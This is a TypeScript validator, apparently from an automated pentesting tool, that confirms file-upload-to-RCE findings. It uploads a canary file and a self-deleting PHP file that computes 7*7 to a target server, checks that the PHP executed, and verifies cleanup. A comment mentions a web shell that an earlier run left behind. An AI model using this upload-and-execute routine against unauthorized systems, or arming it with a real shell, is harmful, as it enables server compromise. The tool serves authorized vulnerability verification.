/**
 * Arbitrary-file-write / file-upload → RCE validator (Gate 1, §4.5). Built from
 * the board's ratified conditions (Decision 0005) after the first live run
 * exploited exactly this class but could not COUNT it (no validator existed, and
 * the command_injection validator was mis-applied with a self-poisoned baseline).
 *
 * Deterministic, non-LLM. Two questions, verifiable-step-chained:
 *   - TECHNICAL SIGNAL: an attacker-controlled file lands in a served path —
 *     write `<nonce>.txt` with a content-nonce, fetch it back, see the nonce
 *     (absent from a baseline captured BEFORE any write — this is what kills the
 *     self-poison bug).
 *   - IMPACT ARTIFACT (execution): an INERT arithmetic file proves code runs —
 *     `<?php echo "<n>A".(7*7)."B";` returns `<n>A49B`, which the file's own
 *     bytes cannot contain (they hold the literal `7*7`). We do NOT plant a
 *     `system($_GET[cmd])` shell (that is the unauthenticated backdoor the last
 *     run left behind); the exec file is fixed-command and SELF-DELETES.
 *
 * SAFETY (Decision 0005 C2–C5):
 *   - artifact names are CSPRNG (`randomBytes`), never predictable;
 *   - the exec file self-unlinks itself and the canary on execution, and we
 *     additionally overwrite artifacts with empty content as a fallback;
 *   - CLEANUP is DECOUPLED from the verdict: `passed` reflects reproduction; a
 *     cleanup we cannot confirm sets `cleanupFailed` + `artifactRefs` (the tool
 *     layer turns that into a blocking operator pause) — it never false-negatives
 *     a proven compromise.
 *   - No exec but a served write → NOT `file_write_rce` (no over-claiming), but
 *     the finding is preserved as the lesser `arbitrary_file_write`, not dropped.
 */
import { randomBytes } from "node:crypto";
import { politeFetch } from "../shared/http-policy.js";
import { type CapturedExchange, MAX_BODY_CHARS, REQUEST_TIMEOUT_MS, type ValidationReport, type VerifiableStep } from "./report.js";

/** A declarative, serializable description of the write primitive — NOT a
 * closure (Decision 0005 C1), so the reasoning core can pass it across the tool
 * boundary. The validator builds the actual write request from this. */
export interface FileWriteTarget {
	/** URL that performs the write (e.g. the vulnerable upload/write endpoint). */
	writeUrl: string;
	/** Form field carrying the target FILENAME. */
	fileField: string;
	/** Form field carrying the file CONTENT. */
	contentField: string;
	/** Where written files surface; `{name}` is replaced by the filename,
	 * e.g. "http://10.0.0.5:81/{name}". */
	fetchUrlTemplate: string;
	/** default POST. */
	writeMethod?: string;
	/** how the write body is encoded. default "form". */
	contentType?: "form" | "multipart";
	/** optional session cookie for the write + fetch. */
	cookie?: string;
}

const csprng = (n = 8): string => randomBytes(n).toString("hex");

async function http(url: string, init: RequestInit, label: string, payload = ""): Promise<CapturedExchange> {
	const controller = new AbortController();
	const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
	try {
		const res = await politeFetch(url, { ...init, signal: controller.signal });
		const body = (await res.text()).slice(0, MAX_BODY_CHARS);
		return { label, requestUrl: url, payload, status: res.status, body };
	} catch (err) {
		return { label, requestUrl: url, payload, status: 0, body: "", networkError: err instanceof Error ? err.message : String(err) };
	} finally {
		clearTimeout(timer);
	}
}

function fetchOf(t: FileWriteTarget, name: string): string {
	return t.fetchUrlTemplate.replace("{name}", name);
}

async function writeFile(t: FileWriteTarget, name: string, content: string): Promise<CapturedExchange> {
	const headers: Record<string, string> = t.cookie ? { Cookie: t.cookie } : {};
	let body: string | FormData;
	if (t.contentType === "multipart") {
		const fd = new FormData();
		fd.set(t.fileField, name);
		fd.set(t.contentField, new Blob([content]), name);
		body = fd; // fetch sets the multipart boundary
	} else {
		headers["content-type"] = "application/x-www-form-urlencoded";
		const p = new URLSearchParams();
		p.set(t.fileField, name);
		p.set(t.contentField, content);
		body = p.toString();
	}
	return http(t.writeUrl, { method: t.writeMethod ?? "POST", headers, body }, `write:${name}`, name);
}

async function get(t: FileWriteTarget, name: string, label: string): Promise<CapturedExchange> {
	const headers = t.cookie ? { Cookie: t.cookie } : undefined;
	return http(fetchOf(t, name), { method: "GET", headers }, label, name);
}

const absent = (ex: CapturedExchange, marker: string): boolean => ex.status === 404 || ex.status === 0 || !ex.body.includes(marker);

export async function validateFileWriteRce(target: FileWriteTarget): Promise<ValidationReport> {
	const steps: VerifiableStep[] = [];
	const attacks: CapturedExchange[] = [];
	const base = csprng();
	const txtName = `pluto_${base}.txt`;
	const phpName = `pluto_${base}.php`;
	const contentNonce = `CN${csprng(6).toUpperCase()}`;
	const execNonce = `EX${csprng(6).toUpperCase()}`;

	// 1. BASELINE — captured BEFORE any write (kills the self-poison false-negative):
	//    the target path must NOT already serve our content.
	const baseline = await get(target, txtName, "baseline");
	const baselineClean = absent(baseline, contentNonce);
	steps.push({ name: "baseline-absent", passed: baselineClean, detail: `baseline GET ${txtName} → HTTP ${baseline.status} (must not already contain the canary)` });

	// 2. TECHNICAL SIGNAL — write a canary file and fetch it back.
	attacks.push(await writeFile(target, txtName, `pluto-canary ${contentNonce}`));
	const servedTxt = await get(target, txtName, "attack-write-served");
	attacks.push(servedTxt);
	const technicalSignal = baselineClean && servedTxt.body.includes(contentNonce);
	steps.push({ name: "file-written-and-served", passed: technicalSignal, detail: technicalSignal ? `${txtName} served attacker content (${contentNonce})` : `canary not served (HTTP ${servedTxt.status})` });

	// 3. IMPACT ARTIFACT — inert, self-deleting arithmetic file proves EXECUTION.
	//    No $_GET shell. The file's bytes hold "7*7"; a "49" in the response can
	//    only come from the interpreter. It also unlinks the canary and itself.
	const phpBody = `<?php echo "${execNonce}A".(7*7)."B"; @unlink(__DIR__."/${txtName}"); @unlink(__FILE__); ?>`;
	attacks.push(await writeFile(target, phpName, phpBody));
	const execRes = await get(target, phpName, "attack-exec");
	attacks.push(execRes);
	const executed = execRes.body.includes(`${execNonce}A49B`) && !execRes.body.includes("7*7");
	steps.push({ name: "code-execution", passed: executed, detail: executed ? "inert arithmetic evaluated by the interpreter (7*7 → 49)" : "no execution — file served without evaluation" });

	// 4. CLEANUP — DECOUPLED from the verdict. The exec file self-unlinks itself
	//    and the canary when it runs; we then VERIFY removal. (A non-executing
	//    write-only case cannot self-clean without a delete primitive, so it will
	//    honestly report cleanupFailed — a do-no-harm alert, never a verdict flip.)
	const vtxt = await get(target, txtName, "cleanup-verify-txt");
	const vphp = await get(target, phpName, "cleanup-verify-php");
	const txtClean = absent(vtxt, contentNonce);
	const phpClean = vphp.status === 404 || vphp.status === 0 || (!vphp.body.includes(execNonce) && !vphp.body.includes("<?php") && vphp.body.trim().length === 0);
	const cleanupOk = txtClean && phpClean;
	const artifactRefs = [txtClean ? null : fetchOf(target, txtName), phpClean ? null : fetchOf(target, phpName)].filter((x): x is string => x !== null);
	steps.push({ name: "artifact-cleanup", passed: cleanupOk, detail: cleanupOk ? "planted artifacts removed/neutralized (verified)" : `ARTIFACT MAY REMAIN at ${artifactRefs.join(", ")} — remove the backing file(s) then /unpause` });

	// VERDICT (Decision 0005 C3): exec proven → file_write_rce; write-only served
	// → the lesser arbitrary_file_write (not dropped, not over-claimed as RCE);
	// neither → not passed. `passed` reflects REPRODUCTION only — NOT cleanup.
	const impactArtifact = executed;
	let validator: string;
	let passed: boolean;
	let summary: string;
	if (technicalSignal && impactArtifact) {
		validator = "file_write_rce";
		passed = true;
		summary = `Arbitrary file write → RCE: wrote and executed ${phpName}; interpreter evaluated 7*7→49 (${execNonce}A49B).`;
	} else if (technicalSignal) {
		validator = "arbitrary_file_write";
		passed = true;
		summary = `Arbitrary file write (no code execution proven): ${txtName} served attacker content. Real finding; NOT RCE.`;
	} else {
		validator = "file_write_rce";
		passed = false;
		summary = `Not reproduced: attacker content did not surface at ${fetchOf(target, txtName)}.`;
	}
	if (!cleanupOk) summary += ` ⚠ ARTIFACT MAY REMAIN at ${artifactRefs.join(", ")} — operator must remove it (do-no-harm), verdict decoupled.`;

	return {
		validator,
		passed,
		technicalSignal,
		impactArtifact,
		diffSummary: summary,
		baseline,
		attacks,
		steps,
		cleanupFailed: !cleanupOk,
		artifactRefs: cleanupOk ? undefined : artifactRefs,
	};
}
